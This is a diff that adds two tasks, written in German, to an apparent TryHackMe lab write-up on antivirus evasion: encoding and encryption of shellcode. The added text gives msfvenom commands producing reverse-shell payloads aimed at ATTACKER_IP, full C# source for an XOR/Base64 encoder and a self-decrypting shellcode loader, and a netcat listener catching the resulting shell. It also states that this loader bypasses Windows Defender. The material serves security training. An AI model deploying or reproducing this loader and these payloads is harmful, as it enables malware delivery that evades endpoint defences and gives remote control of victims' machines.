@@ -673,3 +673,252 @@ Folgen Sie den Anweisungen, um eine gestagte Payload zu erstellen und sie in der
 ```
 Keine Antwort nötig
 ```
+
+# Task 7 - Einführung in Ver- und Entschlüsselung
+### Was ist Encoding?
+
+Encoding ist der Prozess, bei dem Daten aus ihrem ursprünglichen Zustand in ein spezifisches Format umgewandelt werden, abhängig vom Algorithmus oder Typ des Encodings. Es kann auf viele Datentypen angewendet werden, wie Videos, HTML, URLs und Binärdateien (EXE, Bilder usw.).
+
+Encoding ist ein wichtiges Konzept, das häufig für verschiedene Zwecke verwendet wird, einschließlich, aber nicht beschränkt auf:
+
+- Programmkompilierung und -ausführung
+- Datenspeicherung und -übertragung
+- Datenverarbeitung wie Dateikonvertierung
+
+Ebenso wird Encoding bei AV-Umgehungstechniken verwendet, um Shellcode-Strings innerhalb einer Binärdatei zu verstecken. Allerdings ist Encoding allein nicht ausreichend für Umgehungszwecke. Heutzutage ist AV-Software intelligenter und kann eine Binärdatei analysieren. Wenn ein codierter String gefunden wird, wird er dekodiert, um die ursprüngliche Form des Textes zu überprüfen.
+
+Sie können auch zwei oder mehr Encoding-Algorithmen gleichzeitig verwenden, um es der AV schwerer zu machen, den versteckten Inhalt zu entschlüsseln. Die folgende Abbildung zeigt, dass wir den "THM"-String in eine hexadezimale Darstellung umgewandelt und dann mit Base64 codiert haben. In diesem Fall müssen Sie sicherstellen, dass Ihr Dropper solches Encoding verarbeitet, um den String in seinen ursprünglichen Zustand zurückzuführen.
+![Mathematisches Zerlegungsdiagramm](Bilder/2024-07-05-Mathematisches-Zerlegungsdiagramm.png)
+
+### Was ist Verschlüsselung?
+
+Verschlüsselung ist eines der wesentlichen Elemente der Informations- und Datensicherheit, das sich darauf konzentriert, unbefugten Zugriff und Manipulation von Daten zu verhindern. Der Verschlüsselungsprozess beinhaltet die Umwandlung von Klartext (unverschlüsselter Inhalt) in eine verschlüsselte Version, die als Ciphertext bezeichnet wird. Der Ciphertext kann ohne Kenntnis des im Verschlüsselungsprozess verwendeten Algorithmus sowie des Schlüssels nicht gelesen oder entschlüsselt werden.
+
+Ähnlich wie beim Encoding werden Verschlüsselungstechniken für verschiedene Zwecke verwendet, wie z. B. die sichere Speicherung und Übertragung von Daten sowie End-to-End-Verschlüsselung. Verschlüsselung kann auf zwei Arten verwendet werden: durch einen gemeinsamen Schlüssel zwischen zwei Parteien oder durch die Verwendung von öffentlichen und privaten Schlüsseln.
+
+Für weitere Informationen über Verschlüsselung empfehlen wir, den Raum [Encryption - Crypto 101](https://tryhackme.com/r/room/encryptioncrypto101) zu besuchen.
+![Verschlüsselungs-Entschlüsselungs-Prozessdiagramm](Bilder/2024-07-05-Verschlüsselungs-Entschlüsselungs-Prozessdiagramm.png)
+
+### Warum müssen wir über Encoding und Verschlüsselung Bescheid wissen?
+
+AV-Anbieter implementieren ihre AV-Software, um die meisten öffentlichen Tools (wie Metasploit und andere) mithilfe statischer oder dynamischer Erkennungstechniken auf die Blockliste zu setzen. Daher ist ohne Modifizierung des von diesen öffentlichen Tools generierten Shellcodes die Erkennungsrate für Ihren Dropper hoch.
+
+Encoding und Verschlüsselung können in AV-Umgehungstechniken verwendet werden, bei denen wir Shellcode, der in einem Dropper verwendet wird, encodieren und/oder verschlüsseln, um ihn zur Laufzeit vor der AV-Software zu verbergen. Die beiden Techniken können nicht nur verwendet werden, um den Shellcode zu verbergen, sondern auch Funktionen, Variablen usw. In diesem Raum konzentrieren wir uns hauptsächlich darauf, den Shellcode zu verschlüsseln, um Windows Defender zu umgehen.
+
+## Fragen:
+Reicht es aus, Shellcode nur zu encodieren, um Antivirus-Software zu umgehen? (ja/nein)
+```
+
+```
+
+Verwenden Encoding-Techniken einen Schlüssel, um Strings oder Dateien zu encodieren? (ja/nein)
+```
+
+```
+
+Verwenden Verschlüsselungsalgorithmen einen Schlüssel, um Strings oder Dateien zu verschlüsseln? (ja/nein)
+```
+
+```
+
+# Task 8 - Shellcode Ver- und Entschlüsselung
+### Encoding mit MSFVenom
+
+Öffentliche Tools wie Metasploit bieten Encoding- und Verschlüsselungsfunktionen an. AV-Anbieter sind jedoch über die Methoden dieser Tools zur Erstellung ihrer Payloads informiert und ergreifen Maßnahmen, um sie zu erkennen. Wenn Sie solche Funktionen ohne Anpassungen verwenden, besteht eine hohe Wahrscheinlichkeit, dass Ihr Payload sofort erkannt wird, sobald die Datei die Festplatte des Opfers berührt.
+
+Lassen Sie uns einen einfachen Payload mit dieser Methode generieren, um diesen Punkt zu beweisen. Zuerst können Sie alle Encoder auflisten, die msfvenom zur Verfügung stehen, mit folgendem Befehl:
+```shell   
+user@AttackBox$ msfvenom --list encoders | grep excellent
+    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
+    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder        
+```
+
+Wir können angeben, dass wir den Encoder `shikata_ga_nai` mit dem `-e` (Encoder)-Schalter verwenden möchten, und dann spezifizieren, dass wir den Payload dreimal encodieren möchten, mit dem `-i` (Iterations)-Schalter:
+```shell           
+user@AttackBox$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
+Found 1 compatible encoders
+Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 368 (iteration=0)
+x86/shikata_ga_nai succeeded with size 395 (iteration=1)
+x86/shikata_ga_nai succeeded with size 422 (iteration=2)
+x86/shikata_ga_nai chosen with final size 422
+Payload size: 422 bytes
+Final size of csharp file: 2170 bytes        
+```
+
+Wenn wir versuchen, unseren neu generierten Payload auf unsere Testmaschine hochzuladen, wird das AV-Programm ihn sofort markieren, bevor wir überhaupt die Möglichkeit haben, ihn auszuführen:
+![AV Scan Ergebniss](Bilder/2024-07-05-AV-Scan-Ergebniss.png)
+
+Wenn Encoding nicht funktioniert, können wir immer versuchen, den Payload zu verschlüsseln. Intuitiv würden wir erwarten, dass dies eine höhere Erfolgsrate hat, da das Entschlüsseln des Payloads für das AV-Programm eine schwierigere Aufgabe darstellen sollte. Lassen Sie uns das jetzt ausprobieren.
+
+### Verschlüsselung mit MSFVenom
+
+Sie können mit msfvenom leicht verschlüsselte Payloads generieren. Die Auswahl an Verschlüsselungsalgorithmen ist jedoch etwas begrenzt. Um die verfügbaren Verschlüsselungsalgorithmen aufzulisten, können Sie den folgenden Befehl verwenden:
+```shell           
+user@AttackBox$ msfvenom --list encrypt
+Framework Encryption Formats [--encrypt <value>]
+================================================
+
+    Name
+    ----
+    aes256
+    base64
+    rc4
+    xor        
+```
+
+Lassen Sie uns einen XOR-verschlüsselten Payload erstellen. Bei diesem Algorithmustyp müssen Sie einen Schlüssel angeben. Der Befehl würde wie folgt aussehen:
+```shell           
+user@AttackBox$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: xored-revshell.exe        
+```
+
+Wenn wir die resultierende Shell erneut auf die THM Antivirus Check! Seite unter ```http://MACHINE_IP/``` hochladen, wird sie immer noch vom AV erkannt. Der Grund dafür ist, dass AV-Anbieter viel Zeit investiert haben, um sicherzustellen, dass einfache msfvenom-Payloads erkannt werden.
+
+### Erstellung eines benutzerdefinierten Payloads
+
+Der beste Weg, dies zu umgehen, besteht darin, eigene benutzerdefinierte Encoding-Schemata zu verwenden, sodass das AV-Programm nicht weiß, wie es unseren Payload analysieren soll. Beachten Sie, dass Sie nichts allzu Komplexes tun müssen, solange es für das AV-Programm verwirrend genug ist, um die Analyse zu erschweren. Für diese Aufgabe werden wir eine einfache Reverse Shell verwenden, die mit msfvenom generiert wurde, und eine Kombination aus XOR und Base64 anwenden, um Defender zu umgehen.
+
+Lassen Sie uns mit der Generierung einer Reverse Shell im CSharp-Format mit msfvenom beginnen:
+```shell           
+user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
+```
+
+Der Encoder
+
+Bevor wir unseren tatsächlichen Payload erstellen, werden wir ein Programm erstellen, das den von msfvenom generierten Shellcode nimmt und ihn nach Belieben verschlüsselt. In diesem Fall werden wir den Payload zuerst mit einem benutzerdefinierten Schlüssel XORieren und dann mit Base64 codieren. Hier ist der vollständige Code für den Encoder (Sie finden diesen Code auch auf Ihrem Windows-Rechner unter C:\Tools\CS Files\Encryptor.cs):
+
+```cs
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Encrypter
+{
+    internal class Program
+    {
+        private static byte[] xor(byte[] shell, byte[] KeyBytes)
+        {
+            for (int i = 0; i < shell.Length; i++)
+            {
+                shell[i] ^= KeyBytes[i % KeyBytes.Length];
+            }
+            return shell;
+        }
+        static void Main(string[] args)
+        {
+            //XOR Key - It has to be the same in the Droppr for Decrypting
+            string key = "THMK3y123!";
+
+            //Convert Key into bytes
+            byte[] keyBytes = Encoding.ASCII.GetBytes(key);
+
+            //Original Shellcode here (csharp format)
+            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };
+
+            //XORing byte by byte and saving into a new array of bytes
+            byte[] encoded = xor(buf, keyBytes);
+            Console.WriteLine(Convert.ToBase64String(encoded));        
+        }
+    }
+}
+```
+
+Der Code ist ziemlich einfach und wird einen verschlüsselten Payload generieren, den wir in den finalen Payload einbetten werden. Denken Sie daran, die Variable `buf` durch den Shellcode zu ersetzen, den Sie mit msfvenom generiert haben.
+
+Um den Encoder zu kompilieren und auszuführen, können wir die folgenden Befehle auf dem Windows-Rechner verwenden:
+```cmd
+C:\> csc.exe Encrypter.cs
+C:\> .\Encrypter.exe
+qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=
+```
+
+Selbst-dekodierender Payload
+
+Da wir einen verschlüsselten Payload haben, müssen wir unseren Code anpassen, damit er den Shellcode entschlüsselt, bevor er ihn ausführt. Um den Encoder zu entsprechen, werden wir alles in umgekehrter Reihenfolge entschlüsseln, wie wir es verschlüsselt haben. Wir beginnen also damit, den Base64-Inhalt zu entschlüsseln, und setzen dann fort, indem wir das Ergebnis mit demselben Schlüssel XORieren, den wir im Encoder verwendet haben. Hier ist der vollständige Payload-Code (Sie können ihn auch auf Ihrem Windows-Rechner unter `C:\Tools\CS Files\EncStageless.cs` erhalten):
+
+```cs
+using System;
+using System.Net;
+using System.Text;
+using System.Runtime.InteropServices;
+
+public class Program {
+  [DllImport("kernel32")]
+  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+  [DllImport("kernel32")]
+  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+  [DllImport("kernel32")]
+  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+  private static UInt32 MEM_COMMIT = 0x1000;
+  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+  
+  private static byte[] xor(byte[] shell, byte[] KeyBytes)
+        {
+            for (int i = 0; i < shell.Length; i++)
+            {
+                shell[i] ^= KeyBytes[i % KeyBytes.Length];
+            }
+            return shell;
+        }
+  public static void Main()
+  {
+
+    string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
+    byte[] data = Convert.FromBase64String(dataBS64);
+
+    string key = "THMK3y123!";
+    //Convert Key into bytes
+    byte[] keyBytes = Encoding.ASCII.GetBytes(key);
+
+    byte[] encoded = xor(data, keyBytes);
+
+    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);
+
+    IntPtr threadHandle = IntPtr.Zero;
+    UInt32 threadId = 0;
+    IntPtr parameter = IntPtr.Zero;
+    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
+
+    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+
+  }
+}
+```
+
+Beachten Sie, dass wir lediglich ein paar wirklich einfache Techniken kombiniert haben, die erkannt wurden, als sie separat verwendet wurden. Dennoch wird das AV-Programm sich diesmal nicht über den Payload beschweren, da die Kombination beider Methoden nichts ist, was es direkt analysieren kann.
+
+Lassen Sie uns unseren Payload mit dem folgenden Befehl auf dem Windows-Rechner kompilieren:
+```cmd
+C:\> csc.exe EncStageless.cs
+```
+
+Bevor wir unseren Payload ausführen, richten wir einen `nc` Listener ein. Nachdem wir unseren Payload auf die Zielmaschine kopiert und ausgeführt haben, sollten wir wie erwartet eine Verbindung zurückbekommen:
+```shell           
+user@AttackBox$ nc -lvp 443
+Listening on [0.0.0.0] (family 0, port 443)
+Connection from ip-10-10-139-83.eu-west-1.compute.internal 49817 received!
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\System32>
+```
+
+Wie Sie sehen können, sind manchmal einfache Anpassungen ausreichend. In den meisten Fällen funktionieren spezifische Methoden, die Sie online finden, wahrscheinlich nicht sofort, da bereits Erkennungssignaturen für sie existieren könnten. Wenn Sie jedoch ein wenig Fantasie verwenden, um jede Methode anzupassen, könnte dies ausreichen, um eine erfolgreiche Umgehung zu erreichen.
+
+## Fragen:
+Versuchen Sie, diese Technik (Kombination aus Encoding und Verschlüsselung) auf der THM Antivirus Check-Seite unter http://MACHINE_IP/ anzuwenden. Umgeht sie die installierte AV-Software?
+```
+Keine Antwort nötig
+```
